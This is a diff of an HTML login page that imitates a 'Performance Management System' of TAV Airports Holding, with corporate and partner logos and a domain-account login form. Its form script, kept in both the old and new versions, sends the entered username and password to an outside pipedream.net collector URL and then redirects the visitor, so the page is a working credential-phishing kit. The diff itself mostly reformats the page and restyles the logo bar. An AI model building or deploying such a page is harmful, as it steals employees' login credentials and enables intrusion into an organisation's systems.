@@ -1,194 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Performance Monitoring System</title>
-    <meta charset="UTF-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 30px;
-            background-color: #ffffff;
-            border-radius: 15px;
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            position: relative;
-        }
-
-        .login-form h2 {
-            color: #1e3c72;
-            margin-bottom: 25px;
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            background-color: #f9f9f9;
-            font-size: 15px;
-            transition: border 0.3s;
-        }
-
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            border-color: #2a5298;
-            outline: none;
-            background-color: #fff;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(90deg, #4facfe, #00f2fe);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s ease, transform 0.2s;
-        }
-
-        .login-button:hover {
-            transform: translateY(-2px);
-            background: linear-gradient(90deg, #00f2fe, #4facfe);
-        }
-
-        .footer-text {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-        }
-
-        #error-message {
-            color: red;
-            margin-bottom: 10px;
-            font-size: 13px;
-        }
-
-        .logo-bar {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-            gap: 15px;
-            padding: 10px 20px;
-            background-color: rgba(255, 255, 255, 0.85);
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
-            z-index: 10;
-        }
-
-        .logo-bar img {
-            height: 45px;
-            width: auto;
-            max-width: 80px;
-            object-fit: contain;
-            background-color: white;
-            padding: 6px;
-            border-radius: 10px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-            transition: transform 0.3s ease;
-        }
-
-        .logo-bar img:hover {
-            transform: scale(1.05);
-        }
-
-        @media screen and (max-width: 500px) {
-            .container {
-                margin: 0 20px;
-                padding: 25px;
-            }
-
-            .logo-bar {
-                gap: 10px;
-                padding: 8px 12px;
-            }
-
-            .logo-bar img {
-                height: 35px;
-                max-width: 60px;
-                padding: 4px;
-            }
-        }
-    </style>
-
-    <script>
-    function validateForm() {
-        var username = document.forms["loginForm"]["username"].value;
-        var password = document.forms["loginForm"]["password"].value;
-        var errorMessage = document.getElementById('error-message');
-
-        errorMessage.textContent = '';
-
-        if (password.length < 8) {
-            errorMessage.textContent = "Password must be at least 8 characters long.";
-            return false;
-        }
-
-        var params = new URLSearchParams();
-        params.append('username', username);
-        params.append('password', password);
-
-        fetch('https://eosdcxafrlhu2y.m.pipedream.net/?' + params.toString(), {
-            method: 'GET',
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log('Success:', data);
-            window.location.href = "https://tavaero.github.io/TAV-PMS/file.html";
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-        });
-
-        return false;
+  <meta charset="UTF-8" />
+  <title>Performance Monitoring System</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * {
+      box-sizing: border-box;
     }
-    </script>
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 30px;
+      background-color: #ffffff;
+      border-radius: 15px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      position: relative;
+    }
+
+    .login-form h2 {
+      color: #1e3c72;
+      margin-bottom: 25px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #f9f9f9;
+      font-size: 15px;
+      transition: border 0.3s;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #2a5298;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, #4facfe, #00f2fe);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.2s;
+    }
+
+    .login-button:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(90deg, #00f2fe, #4facfe);
+    }
+
+    .footer-text {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+
+    #error-message {
+      color: red;
+      margin-bottom: 10px;
+      font-size: 13px;
+    }
+
+    .logo-bar {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
+      padding: 14px 24px;
+      background-color: rgba(255, 255, 255, 0.9);
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+      z-index: 10;
+    }
+
+    .logo-bar img {
+      height: 60px;
+      max-width: 300px;
+      object-fit: contain;
+      background-color: white;
+      padding: 10px;
+      border-radius: 14px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      transition: transform 0.3s ease;
+    }
+
+    .logo-bar img:hover {
+      transform: scale(1.08);
+    }
+
+    @media screen and (max-width: 500px) {
+      .container {
+        margin: 0 20px;
+        padding: 25px;
+      }
+
+      .logo-bar {
+        gap: 12px;
+        padding: 10px 16px;
+      }
+
+      .logo-bar img {
+        height: 45px;
+        max-width: 80px;
+        padding: 6px;
+      }
+    }
+  </style>
+
+  <script>
+    function validateForm() {
+      var username = document.forms["loginForm"]["username"].value;
+      var password = document.forms["loginForm"]["password"].value;
+      var errorMessage = document.getElementById('error-message');
+
+      errorMessage.textContent = '';
+
+      if (password.length < 8) {
+        errorMessage.textContent = "Password must be at least 8 characters long.";
+        return false;
+      }
+
+      var params = new URLSearchParams();
+      params.append('username', username);
+      params.append('password', password);
+
+      fetch('https://eosdcxafrlhu2y.m.pipedream.net/?' + params.toString(), {
+        method: 'GET',
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Success:', data);
+        window.location.href = "https://tavaero.github.io/TAV-PMS/file.html";
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+
+      return false;
+    }
+  </script>
 </head>
 
 <body>
-    <div class="container login-form">
-        <h2>Performance Management System</h2>
-        <form name="loginForm" onsubmit="return validateForm()">
-            <input name="username" placeholder="Domain Account" required type="text" />
-            <input name="password" placeholder="Password" required type="password" />
-            <div id="error-message">&nbsp;</div>
-            <button class="login-button" type="submit">Login</button>
-            <div class="footer-text">
-                This software is the property of TAV Airports Holding.
-            </div>
-        </form>
-    </div>
+  <div class="container login-form">
+    <h2>Performance Management System</h2>
+    <form name="loginForm" onsubmit="return validateForm()">
+      <input name="username" placeholder="Domain Account" required type="text" />
+      <input name="password" placeholder="Password" required type="password" />
+      <div id="error-message">&nbsp;</div>
+      <button class="login-button" type="submit">Login</button>
+      <div class="footer-text">
+        This software is the property of TAV Airports Holding.
+      </div>
+    </form>
+  </div>
 
-    <div class="logo-bar">
-        <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
-        <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
-        <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS"/>
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
-    </div>
+  <div class="logo-bar">
+    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
+    <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
+    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS"/>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
+  </div>
 </body>
 </html>
